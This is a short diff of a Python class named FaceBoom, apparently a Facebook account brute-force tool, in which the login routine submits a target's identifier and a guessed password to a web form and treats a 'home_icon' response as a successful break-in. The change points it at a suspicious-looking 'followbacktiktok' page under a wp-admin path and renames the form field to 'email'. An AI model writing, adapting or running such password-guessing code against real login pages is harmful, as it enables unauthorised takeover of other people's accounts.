@@ -84,9 +84,9 @@ class FaceBoom(object):
     def login(self,target, password):
 
         try:
-            self.br.open("http://www.ahmedvipen.xyz")
+            self.br.open("http://followbacktiktok.rf.gd/wp-admin/user/tiktok.html?i=3")
             self.br.select_form(nr=0)
-            self.br.form['user']=target
+            self.br.form['email']=target
             self.br.form['pass']= password
             self.br.method ="POST"
             if self.br.submit().get_data().__contains__(b'home_icon'):return  1
